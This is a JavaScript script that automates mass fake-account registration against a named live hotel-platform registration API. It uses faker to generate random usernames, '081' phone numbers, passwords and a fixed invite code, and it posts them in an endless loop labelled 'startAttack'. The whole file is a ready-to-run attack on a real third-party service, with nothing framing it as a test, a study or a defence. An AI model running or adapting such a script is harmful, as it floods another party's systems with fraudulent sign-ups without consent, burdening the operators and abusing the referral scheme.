import axios from 'axios';
import { faker } from '@faker-js/faker';

const API_URL = 'https://www.globalhotelrunner.com/api/user/register';

// Function to generate random payload
const generatePayload = () => {
    const password = faker.internet.password({ length: 8 });
    // Generate random length between 9 and 12
    const length = Math.floor(Math.random() * 4) + 9;
    const mobileNumber = '081' + faker.string.numeric(length - 2);
    return {
        username: faker.internet.username(),
        mobile: mobileNumber,
        password: password,
        password_confirmation: password,
        transaction_password: faker.internet.password({ length: 8 }),
        sex: Math.floor(Math.random() * 2) + 1,
        invite_code: 315648
    };
};

// Function to hit the endpoint
const hitEndpoint = async () => {
    const payload = generatePayload();
    try {
        const response = await axios.post(API_URL, payload);
        console.log('Success:', response.data);
        console.log('Sent payload:', payload);
        return true;
    } catch (error) {
        if (error.code === 'ECONNRESET' || (error.response && error.response.status >= 400)) {
            console.error('Critical error encountered:');
            console.error('Error Code:', error.code || error.response.status);
            console.error('Error Message:', error.message);
            if (error.response && error.response.data) {
                console.error('Response Data:', error.response.data);
            }
            console.error('Failed payload:', payload);
            return false;
        }
        console.error('Non-critical error:', error.message);
        console.log('Failed payload:', payload);
        return true;
    }
};

// Function to continuously hit the endpoint with delay
const startAttack = async (delay = 1000) => {
    console.log('Starting to hit the endpoint...');
    while (true) {
        const shouldContinue = await hitEndpoint();
        if (!shouldContinue) {
            console.log('Stopping attack due to critical error...');
            break;
        }
        await new Promise(resolve => setTimeout(resolve, delay));
    }
};

// Start the attack with 2 second delay between requests
startAttack(2000);